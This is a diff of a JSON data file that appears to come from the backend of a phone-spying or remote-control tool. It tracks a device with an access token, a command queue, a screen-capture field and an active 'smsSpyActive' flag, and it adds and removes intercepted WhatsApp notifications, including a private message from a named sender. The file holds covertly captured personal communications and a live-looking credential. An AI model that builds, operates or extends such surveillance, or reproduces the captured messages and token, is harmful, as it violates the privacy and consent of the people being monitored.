@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776907692568,
+    "lastSeen": 1776907707539,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎61 pesan dari 39 chat",
+        "time": "23/04 09:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776907710106
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎62 pesan dari 40 chat",
+        "time": "23/04 09:28",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776907695043
+      },
       {
         "appName": "WhatsApp",
         "sender": "Oi: Bot Gc",
@@ -4003,22 +4019,6 @@
         "time": "22/04 18:31",
         "pkg": "com.whatsapp",
         "receivedAt": 1776853897771
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎55 pesan dari 34 chat",
-        "time": "22/04 18:31",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776853896563
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Rafly",
-        "content": "kalo mau nunggu bang reno ini",
-        "time": "22/04 18:31",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776853896474
       }
     ],
     "galleryPhotos": [],
